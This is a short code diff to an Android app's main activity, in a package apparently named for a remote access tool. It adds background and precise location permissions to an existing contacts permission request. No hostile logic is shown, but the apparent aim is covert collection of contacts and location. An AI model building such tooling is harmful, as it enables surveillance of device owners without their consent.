@@ -3,19 +3,21 @@ package ru.awawa.rat
 import android.content.pm.PackageManager
 import android.os.Build
 import android.os.Bundle
-import android.util.Log
 import com.google.android.material.bottomnavigation.BottomNavigationView
 import androidx.appcompat.app.AppCompatActivity
 import androidx.navigation.findNavController
 import androidx.navigation.ui.AppBarConfiguration
 import androidx.navigation.ui.setupActionBarWithNavController
 import androidx.navigation.ui.setupWithNavController
-import java.util.jar.Manifest
+
 
 class MainActivity : AppCompatActivity() {
 
     private val permissions = arrayOf(
-            android.Manifest.permission.READ_CONTACTS
+            android.Manifest.permission.READ_CONTACTS,
+            android.Manifest.permission.ACCESS_BACKGROUND_LOCATION,
+            android.Manifest.permission.ACCESS_COARSE_LOCATION,
+            android.Manifest.permission.ACCESS_FINE_LOCATION
     )
 
     override fun onCreate(savedInstanceState: Bundle?) {
